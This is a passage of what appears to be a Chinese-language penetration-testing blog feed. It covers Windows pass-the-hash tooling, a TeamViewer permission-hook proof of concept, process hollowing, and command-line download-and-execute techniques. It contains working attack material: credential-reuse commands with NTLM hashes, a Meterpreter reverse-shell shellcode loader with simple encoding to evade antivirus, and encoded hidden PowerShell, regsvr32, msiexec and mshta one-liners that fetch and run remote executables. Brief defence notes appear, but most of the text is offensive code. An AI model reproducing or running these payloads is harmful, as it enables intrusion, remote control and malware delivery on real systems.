当我们获得某个用户的口令hash，并且条件限定我们不去破解明文口令，实现Pass The Hash都有哪些工具呢？ 1、Kali下的工具(1) meterpreteruse exploit/windows/smb/psexec_psh (2) 工具集位于密码攻击-Passing the Hash下，如下图 包含多种利用工具 2、Windows系统下的工具(1) pythonwmiexec： 参考地址： https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py exe版本下载地址： https://github.com/maaaaz/impacket-examples-windows 注： wmiexec.py的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可 参数实例： wmiexec -hashes 00000000000000000000000000000000:7ECFFFF0C3548187607A14BAD0F88BB1 TEST/test1@192.168.1.1 &quot;whoami&quot; wmiexec.py的hash参数格式为LMHASH:NTHASH，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值 (2) powershell参考地址： https://github.com/Kevin-Robertson/Invoke-TheHash/ 支持多种方式 Invoke-WMIExec： 参数实例： Invoke-WMIExec -Target 192.168.1.1 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command &quot;calc.exe&quot; -verbose 类似wmiexec.py Invoke-SMBExec： 支持SMB1, SMB2 (2.1), and SMB signing 参数实例： Invoke-SMBExec -Target 192.168.0.2 -Domain test.local -Username test1 -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command &quot;calc.exe&quot; -verbose 通过在目标主机创建服务执行命令，所以权限为system Invoke-SMBClient： 支持SMB1, SMB2 (2.1), and SMB signing 如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本 支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限) (3) mimikatzPass-The-Hash： 实际上为Overpass-the-hash 参数实例： privilege：：debug sekurlsa::pth /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1 注： mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息 对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012，可以使用AES keys代替NT hash Pass-The-Ticket： 考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo，下载地址： https://github.com/gentilkiwi/kekeo 参数实例： kekeo &quot;tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1&quot; 执行后生成票据`TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi` 接下来导入票据： kekeo &quot;kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi&quot; 0x04 小结 本文列举了多种实现Pass The Hash的工具，欢迎补充 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[TeamViewer 13.0.5058中的权限漏洞测试]]></title>
    <url>%2Fposts%2F1330b86c.html</url>
    <content type="text"><![CDATA[0x00 前言 12月5日，TeamViewer发布新版本13.0.5640，修复了之前版本13.0.5058中的一个bug。 随后，gellin在github上传了该漏洞的POC，安全信息网站ThreatPost对这个情况作了报道。 但一眼看上去，该漏洞的描述和POC较难理解，于是，本文对其做了进一步测试，验证POC，得出结论 POC: https://github.com/gellin/TeamViewer_Permissions_Hook_V1 ThreatPost报道： https://threatpost.com/teamviewer-rushes-fix-for-permissions-bug/129096/ 0x01 简介 本文将要介绍以下内容： POC测试 原理简要分析 利用思路 防御 0x02 POC测试 1、编译生成dllPOC通过c++开发，在使用VS2012对其编译时会出现如下bug： error C2784: “std::_String_iterator&lt;_Mystr&gt; std::operator +(_String_iterator&lt;_Mystr&gt;::difference_type,std::_String_iterator&lt;_Mystr&gt;)”:未能从“std::string”为“std::_String_iterator&lt;_Mystr&gt;”推导 模板 参数 bug出现的位置： https://github.com/gellin/TeamViewer_Permissions_Hook_V1/blob/master/TeamViewerHook_13_0_3711_88039/main.cpp#L25 Bug出现的原因是作者使用更高版本的Visual Studio编写，况且这段代码的功能是输出，所以可以忽略，修改后的代码如下： console = new Console(std::string(BANNER), std::string(&quot;TeamViewer Permissions Hook v1&quot;)); 编译成功，生成TeamViewerHook_13_0_3711_88039.dll 2、测试环境搭建主机1(Server)： 操作系统：Win8 x86 安装TeamViewer 13.0.5058 作为被控制端，ID为543 847 147，密码为49s4eb 主机2(Client)： 操作系统：Win8 x86 安装TeamViewer 13.0.5058 作为控制端，用于远程连接主机1 3、测试功能A： 主机1(Server)反控主机2(Client)主机2(Client)填入ID和密码，成功远程连接主机1(Server) 如下图 注： TeamViewer支持的一个正常功能： 主机2(Client)选择通信-与伙伴切换角色控制，能够切换角色，允许主机1(Server)反过来控制主机2(Client)，如下图 POC的第一个功能： 实现主机1(Server)未经授权，反过来控制主机2(Client) 流程如下： 在主机1(Server)上，将TeamViewerHook_13_0_3711_88039.dll注入到TeamViewer的进程 这里可使用APC注入，代码可参考： https://github.com/3gstudent/Inject-dll-by-APC/blob/master/test.cpp dll注入前，主机1(Server)单击会话列表，如下图 下面进行dll注入，按照提示输入NUMPAD 1，选择Host/Server，如下图 再次单击主机1(Server)的会话列表，列表被修改，如下图 选中切换角色，即可实现主机1(Server)反过来控制主机2(Client) 4、测试功能B： 主机2(Client)解锁鼠标键盘同测试A，主机2(Client)填入ID和密码，成功远程连接主机1(Server) 主机1(Server)通过设置会话列表，禁止主机2(Client)的鼠标进行远程控制，如下图 正常情况下，主机2(Client)无法使用鼠标对主机1(Server)进行远程控制 POC的第二个功能： 实现主机2(Server)未经授权，解锁鼠标，远程控制主机1(Server) 下面进行dll注入，按照提示输入NUMPAD 2，选择client，如下图 成功解锁鼠标，远程控制主机1(Server)，如下图 0x03 原理简要分析 通过dll注入，搜索目标进程的内存，找到代表权限的指针地址，重新赋值，进行naked inline hook，实现权限的修改 修改后的内存结构如下图 具体的实现方法可参照源代码 0x04 利用思路 1、功能A： 主机1(Server)反控主机2(Client)如果主机1(Server)通过漏洞成功反控主机2(Client)，默认情况下，主机2(Client)的桌面会显示成被控制的状态 但是，既然通过dll注入能够修改TeamViewer进程的内存数据，那么也能够通过修改内存数据控制主机2(Client)的桌面显示内容(例如黑屏、正常屏幕(不推荐)等) 公开的POC未实现控制主机2(Client)桌面显示内容的功能，考虑到这个漏洞的危害，本文不会介绍POC转为EXP的具体方法 2、功能B： 主机2(Client)解锁鼠标键盘利用前提为主机2(Client)已经成功远程连接主机1(Server)，当主机1(Server)选择禁用主机2(Client)的鼠标时，该功能才会发挥作用 0x05 防御思路 1、建议用户升级TeamViewer新版本13.0.5640 注： 截止本文编写，TeamViewer官网尚未发布该升级版本的具体内容，地址如下： https://www.teamviewer.com/en/download/changelog/ 2、不要随意连接未知的TeamViewer服务器 0x06 小结 本文对TeamViewer 13.0.5058中的权限漏洞POC进行测试，简要介绍原理和利用思路，给出防御建议 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[傀儡进程的实现与检测]]></title>
    <url>%2Fposts%2F92227cb8.html</url>
    <content type="text"><![CDATA[0x00 前言 最近在安全动态推送中看到了一篇文章《RunPE: How to hide code behind a legit process》，介绍了将恶意代码注于已知进程的方法 文章发布于2015年6月，虽然作者未公布完整的实现代码，但介绍了实现思路 本文将结合自己的心得做进一步介绍，测试开源实现代码，介绍防御方法 文章地址： https://www.adlice.com/runpe-hide-code-behind-legit-process/ 0x01 简介 本文将要介绍以下内容： 实现原理 开源代码测试 优化思路 防御检测 0x02 实现原理 这个利用方法至少在2005以前就存在，国内常常把该方法称为”傀儡进程的创建” 实现思路： 通过CreateProcess创建进程，传入参数CREATE_SUSPENDED使进程挂起 通过NtUnmapViewOfSection清空新进程的内存数据 通过VirtualAllocEx申请新的内存 通过WriteProcessMemory向内存写入payload 通过SetThreadContext设置入口点 通过ResumeThread唤醒进程，执行payload 在具体实现上，还需要考虑以下问题： 1、傀儡进程的选择如果傀儡进程已经运行，那么将无法实现替换(指针不可控、无法获得主线程句柄等) 所以这种利用方法只能通过创建新进程，传入参数CREATE_SUSPENDED使进程挂起，在进程执行前对其替换 2、清空新进程的内存数据进程初始化后，内存会加载映像文件，为了清空新进程的内存数据，可以使用函数NtUnmapViewOfSection卸载映像 函数NtUnmapViewOfSection需要从ntdll.dll获得，调用代码如下： FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, &quot;NtUnmapViewOfSection&quot;); _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection; DWORD dwResult = NtUnmapViewOfSection(pProcessInfo-&gt;hProcess, pPEB-&gt;ImageBaseAddress); 注： NtUnmapViewOfSection还能用来结束进程 3、申请新的内存使用VirtualAllocEx函数时，可以将傀儡进程的ImageBaseAddress作为申请空间的首地址，这样可以避免考虑“重定位”的问题 4、写入payload写入时，需要先比较payload和傀儡进程的ImageBaseAddress之间的偏移，如果存在偏移，需要进行重定位(使用.reloc区段) 5、恢复环境替换前后需要保证寄存器正常，所以仅需要修改进程的入口点(即EAX寄存器) 通过GetThreadContext获得所有寄存器的信息(保存在结构体_CONTEXT中) _CONTEXT的定义位于winnt.h，具体内容如下： typedef struct _CONTEXT { // // The flags values within this flag control the contents of // a CONTEXT record. // // If the context record is used as an input parameter, then // for each portion of the context record controlled by a flag // whose value is set, it is assumed that that portion of the // context record contains valid context. If the context record // is being used to modify a threads context, then only that // portion of the threads context will be modified. // // If the context record is used as an IN OUT parameter to capture // the context of a thread, then only those portions of the thread’s // context corresponding to set flags will be returned. // // The context record is never used as an OUT only parameter. // DWORD ContextFlags; // // This section is specified/returned if CONTEXT_DEBUG_REGISTERS is // set in ContextFlags. Note that CONTEXT_DEBUG_REGISTERS is NOT // included in CONTEXT_FULL. // DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_FLOATING_POINT. // FLOATING_SAVE_AREA FloatSave; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_SEGMENTS. // DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_INTEGER. // DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_CONTROL. // DWORD Ebp; DWORD Eip; DWORD SegCs; // MUST BE SANITIZED DWORD EFlags; // MUST BE SANITIZED DWORD Esp; DWORD SegSs; // // This section is specified/returned if the ContextFlags word // contains the flag CONTEXT_EXTENDED_REGISTERS. // The format and contexts are processor specific // BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];} CONTEXT; 将寄存器EAX的值设置为起始地址，代码如下： pContext-&gt;Eax = (DWORD)pPEB-&gt;ImageBaseAddress + pSourceHeaders-&gt;OptionalHeader.AddressOfEntryPoint; 接着利用SetThreadContext写入，修改入口点 通过ResumeThread唤醒进程，即可执行payload 0x03 开源代码测试 实现傀儡进程的公开代码有很多，这里给出一个参考地址: http://code.google.com/p/process-hollowing/downloads/list 该工程的说明文档地址： http://www.autosectools.com/process-hollowing.pdf 测试如下图 如果需要查看内存数据，可以使用https://www.adlice.com/runpe-hide-code-behind-legit-process/中使用的工具：Process Hacker 参照上图的输出数据，image base为0x00B90000 查看新进程0x00B90000的数据，已经被成功替换为payload 如下图 继续下面的测试，参照源代码，修改payload为执行shellcode格式的Meterpreter server： use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 192.168.81.192 exploit Clinet： msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.81.192 LPORT=4444 -f c or use windows/shell/reverse_tcp set LHOST 192.168.81.192 generate -t c 选择stage 1(281 bytes)即可 生成shellcode后，HelloWorld工程实现执行shellcode功能的源代码如下： #include &lt;windows.h&gt; int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow) { unsigned char shellcode1[] = &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot; &quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot; &quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot; &quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot; &quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot; &quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot; &quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot; &quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot; &quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot; &quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot; &quot;\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot; &quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x51\xc0\x68\x02&quot; &quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot; &quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot; &quot;\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2&quot; &quot;\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot; &quot;\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58&quot; &quot;\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9&quot; &quot;\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3&quot;; typedef void (__stdcall *CODE) (); PVOID p = NULL; if ((p = VirtualAlloc(NULL, sizeof(shellcode1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) MessageBoxA(NULL, &quot;error&quot;, &quot;VirtualAlloc&quot;, MB_OK); if (!(memcpy(p, shellcode1, sizeof(shellcode1)))) MessageBoxA(NULL, &quot;error&quot;, &quot;memcpy&quot;, MB_OK); CODE code =(CODE)p; code(); return 0; } 执行ProcessHollowing.exe，加载HelloWorld.exe，弹回shell，如下图 由于使用了Meterpreter，HelloWorld.exe会被杀毒软件静态查杀，这里做一个简单的加解密即可绕过 对HelloWorld.exe逐字符作0x33加，源代码如下： #include &lt;windows.h&gt; char *SoucePath = &quot;c:\\1\\HelloWorld.exe&quot;; char *DesPath = &quot;c:\\1\\test\\HelloWorld.exe&quot;; int _tmain(int argc, _TCHAR* argv[]) { HANDLE hFile = CreateFileA ( SoucePath, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 ); if (hFile == INVALID_HANDLE_VALUE) { printf(&quot;Open file error\n&quot;); return 0; } DWORD dwSize = GetFileSize(hFile, 0); PBYTE pBuffer = new BYTE[dwSize]; DWORD dwBytesRead = 0; ReadFile(hFile, pBuffer, dwSize, &amp;dwBytesRead, 0); PBYTE pBuffer2 = new BYTE[dwSize]; PBYTE pBuffer3 = new BYTE[dwSize]; for(DWORD i=0;i&lt;dwSize;i++) { pBuffer2[i]=pBuffer[i]+0x33; } /* for(DWORD i=0;i&lt;dwSize;i++) { pBuffer3[i]=pBuffer2[i]-0x33; } */ HANDLE hFile2 = CreateFileA ( DesPath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 ); if (hFile2 == INVALID_HANDLE_VALUE) { printf(&quot;Create file error\n&quot;); CloseHandle(hFile2); return 0; } WriteFile(hFile2,pBuffer2,dwSize,&amp;dwSize,NULL); CloseHandle(hFile2); return 0; } 输出新的加密文件HelloWorld.exe，不会被静态查杀 ProcessHollowing工程添加一个解密操作，逐字符作0x33减，关键代码如下： DWORD dwSize = GetFileSize(hFile, 0); PBYTE pBuffer = new BYTE[dwSize]; PBYTE pBuffer2 = new BYTE[dwSize]; DWORD dwBytesRead = 0; ReadFile(hFile, pBuffer2, dwSize, &amp;dwBytesRead, 0); for(DWORD i=0;i&lt;dwSize;i++) { pBuffer[i]=pBuffer2[i]-0x33; } 至此，完成静态查杀的绕过 注： ProcessHollowing.exe行为拦截的绕过，本文暂不介绍 0x04 防御检测这种傀儡进程的利用，由于最开始创建了正常的进程，因此欺骗性很高 例如创建傀儡进程calc.exe,进程的图标和描述都是正常的calc.exe，数字签名也正常 如下图 防御方法： 使用杀毒软件，拦截函数SetThreadContext 参考原文给出的建议，使用RogueKiller，对比PE文件在本地和内存之间是否有区别 RogueKiller下载地址： https://www.adlice.com/download/roguekiller/ 检测如下图 0x05 小结 本文站在技术研究的角度，介绍了“傀儡进程”实现的原理，测试开源代码，给出防御检测的方法。虽然是很古老的技术，但其中的技术细节值得掌握。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——从github下载文件的多种方法]]></title>
    <url>%2Fposts%2F38632724.html</url>
    <content type="text"><![CDATA[0x00 前言 本文源于一个有趣的问题： 已知exe文件：https://github.com/3gstudent/test/raw/master/putty.exe Windows环境，需要将该exe释放到指定目录并执行，例如c:\download 问：通过cmd实现的最短代码是多少字符？ 0x01 简介 本文将要介绍以下内容： 通过cmd实现从github下载文件的方法汇总 选出最短代码的实现方法 0x02 分析 在之前的文章《渗透技巧——通过cmd上传文件的N种方法》对通过命令行下载文件的方法做了汇总 而github支持https协议，并不支持http协议，所以在利用上需要注意一些问题，有些方法不支持http协议 0x03 可用方法汇总 1、powershellpowershell (new-object System.Net.WebClient).DownloadFile(&#39;https://github.com/3gstudent/test/raw/master/putty.exe&#39;,&#39;c:\download\a.exe&#39;);start-process &#39;c:\download\a.exe&#39; 2、certutilcertutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe&amp;&amp;c:\download\a.exe 3、bitsadminbitsadmin /transfer n http://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe &amp;&amp; c:\download\a.exe 注： 使用bitsadmin的下载速度较慢 4、regsvr32regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec.sct scrobj.dll 原理： regsve32-&gt;JScript-&gt;powershell-&gt;download&amp;exec JScript调用powershell实现下载执行的代码为： new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#39;https://github.com/3gstudent/test/raw/master/putty.exe&#39;,&#39;c:\\download\\a.exe&#39;);start-process &#39;c:\\download\\a.exe&#39;&quot;,0,true); 参照sct文件格式： https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct 添加功能，生成downloadexec.sct 实现功能： regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec.sct scrobj.dll 当然，为了减少调用的程序，也可以使用以下思路： regsve32-&gt;VBScript-&gt;download&amp;exec 通常，vbs脚本实现的下载执行代码： Const adTypeBinary = 1 Const adSaveCreateOverWrite = 2 Dim http,ado Set http = CreateObject(&quot;Msxml2.XMLHTTP&quot;) http.open &quot;GET&quot;,&quot;http://192.168.81.192/putty.exe&quot;,False http.send Set ado = createobject(&quot;Adodb.Stream&quot;) ado.Type = adTypeBinary ado.Open ado.Write http.responseBody ado.SaveToFile &quot;c:\download\a.exe&quot; ado.Close 但该脚本不支持https下载，可以换用Msxml2.ServerXMLHTTP.6.0 代码如下： Const adTypeBinary = 1 Const adSaveCreateOverWrite = 2 Dim http,ado Set http = CreateObject(&quot;Msxml2.ServerXMLHTTP.6.0&quot;) http.SetOption 2, 13056 http.open &quot;GET&quot;,&quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;,False http.send Set ado = createobject(&quot;Adodb.Stream&quot;) ado.Type = adTypeBinary ado.Open ado.Write http.responseBody ado.SaveToFile &quot;c:\download\a.exe&quot; ado.Close 注： 该思路来自@mosin @索马里海贼 也可以通过WinHttp.WinHttpRequest.5.1实现，代码如下： Const adTypeBinary = 1 Const adSaveCreateOverWrite = 2 Dim http,ado Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) http.open &quot;GET&quot;,&quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;,False http.send Set ado = createobject(&quot;Adodb.Stream&quot;) ado.Type = adTypeBinary ado.Open ado.Write http.responseBody ado.SaveToFile &quot;c:\download\a.exe&quot; ado.Close 注： 该思路来自@ogre vbs脚本实现的执行代码 WScript.CreateObject(&quot;WScript.Shell&quot;).Run &quot;c:\download\a.exe&quot;,0,true 依旧是以sct文件作为模板，添加功能，生成downloadexec2.sct 实现功能： regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec2.sct scrobj.dll 5、pubprn.vbs利用pubprn.vbs能够执行远程服务器上的sct文件(sct文件格式有区别) 思路： regsve32-&gt;VBScript-&gt;download&amp;exec 代码已上传，地址为https://raw.githubusercontent.com/3gstudent/test/master/downloadexec3.sct 实现功能： cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec3.sct 当然，也可使用如下思路实现(代码略)： regsve32-&gt;JScript-&gt;powershell-&gt;download&amp;exec 6、msiexec该方法我之前的两篇文章《渗透测试中的msiexec》《渗透技巧——从Admin权限切换到System权限》有过介绍，细节不再赘述 首先将powershell实现下载执行的代码作base64编码： $fileContent = &quot;(new-object System.Net.WebClient).DownloadFile(&#39;https://github.com/3gstudent/test/raw/master/putty.exe&#39;,&#39;c:\download\a.exe&#39;);start-process &#39;c:\download\a.exe&#39;&quot; $bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent); $encoded = [System.Convert]::ToBase64String($bytes); $encoded 得到： KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA== 完整powershell命令为： powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA== 完整wix文件为： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt; &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt; &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt; &lt;Media Id=&quot;1&quot; /&gt; &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt; &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt; &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt; &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt; &lt;/Component&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt; &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt; &lt;/Feature&gt; &lt;Property Id=&quot;cmdline&quot;&gt;powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA== &lt;/Property&gt; &lt;CustomAction Id=&quot;SystemShell&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand=&#39;[cmdline]&#39; Return=&quot;ignore&quot; Impersonate=&quot;no&quot;/&gt; &lt;CustomAction Id=&quot;FailInstall&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt; invalid vbs to fail install &lt;/CustomAction&gt; &lt;InstallExecuteSequence&gt; &lt;Custom Action=&quot;SystemShell&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt; &lt;Custom Action=&quot;FailInstall&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt; &lt;/InstallExecuteSequence&gt; &lt;/Product&gt; &lt;/Wix&gt; 将其编译，生成msi文件，命令如下： candle.exe msigen.wix light.exe msigen.wixobj 生成test.msi 实现功能： msiexec /q /i https://github.com/3gstudent/test/raw/master/test.msi 注： 执行后需要手动结束进程msiexec.exe 7、mshtamshta支持http和htpps 但mshta在执行hta脚本时，类似于浏览器，会根据链接返回头进行对应的解析操作，所以这里只有当返回头为html时才会运行 否则会被当普通文本进行解析 对于github的代码，返回的格式为text/plain 如果使用如下命令执行： mshta https://raw.githubusercontent.com/3gstudent/test/master/calc.hta 会把代码当成text，无法解析成html，导致脚本无法执行 但是我们可以换一个思路： 将hta文件传到github的博客下面，就能够被解析成html，实现代码执行 将hta文件上传至github博客下面，地址为https://3gstudent.github.io/test/calc.hta 执行如下命令： mshta https://3gstudent.github.io/test/calc.hta 成功弹出计算器 注: 该思路来自于DM_ 添加功能，实现下载执行，命令如下： mshta https://3gstudent.github.io/test/downloadexec.hta 弹框提示此计算机上的安全设置禁止访问其它域的数据源，如下图 解决方法： IE浏览器-Internet选项-安全 选择可信站点，添加博客地址：https://3gstudent.github.io/ 如下图 自定义级别，找到通过域访问数据源，选择启用 如下图 再次测试，成功实现下载执行的功能 经过以上的测试，我们发现IE浏览器默认会拦截vbs脚本实现的下载功能 那么，我们可以大胆猜测，如果下载执行换成powershell实现的话，那么就不会被拦截 修改脚本，上传至github 命令如下： mshta https://3gstudent.github.io/test/downloadexec2.hta 经过测试，该方法可用 使用短地址 有趣的是 http://dwz.cn/ 不支持该域名 换一个短地址网站 http://sina.lt/ 生成短地址，最终命令为： mshta http://t.cn/RYUQyF8 最终实现的最短字符长度为25 0x04 补充 1、IEExec需要管理员权限 cd C:\Windows\Microsoft.NET\Framework\v2.0.50727\ caspol -s off IEExec http://github.com/3gstudent/test/raw/master/putty.exe 注： exe需要满足特定格式 详情可参考： https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/ 注： 我在Win7下复现失败 0x05 小结 本文对通过cmd实现从github下载文件的方法做了汇总，最短的实现方式为mshta http://t.cn/RYUQyF8 实现的最短字符长度为25 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——从Admin权限切换到System权限]]></title>
    <url>%2Fposts%2F98352077.html</url>
